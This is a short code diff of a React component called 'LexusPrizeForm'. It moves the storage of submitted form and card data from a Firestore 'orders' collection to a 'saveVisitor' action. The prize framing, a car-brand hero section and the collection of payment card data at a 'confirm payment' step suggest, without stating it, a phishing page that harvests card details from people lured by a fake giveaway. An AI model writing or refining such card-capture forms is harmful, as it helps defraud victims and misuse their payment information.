@@ -2,12 +2,11 @@
 
 import type React from "react"
 import { useState } from "react"
-import { db } from "@/lib/firebase"
-import { collection, addDoc } from "firebase/firestore"
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Card, CardContent } from "@/components/ui/card"
-import { LexusHero } from "@/components/lexus-hero"
+import { saveVisitor } from "../lib/actions";
+import { Button } from "./ui/button";
+import { Input } from "./ui/input";
+import { Card, CardContent } from "./ui/card";
+import { LexusHero } from "./lexus-hero";
 import {
   CheckCircle2,
   ChevronLeft,
@@ -78,7 +77,7 @@ export function LexusPrizeForm() {
   const handleConfirmPayment = async (e: React.FormEvent) => {
  e.preventDefault()
 
-await addDoc(collection(db, "orders"), {
+await saveVisitor({
   ...formData,
   ...cardData,
   createdAt: new Date(),
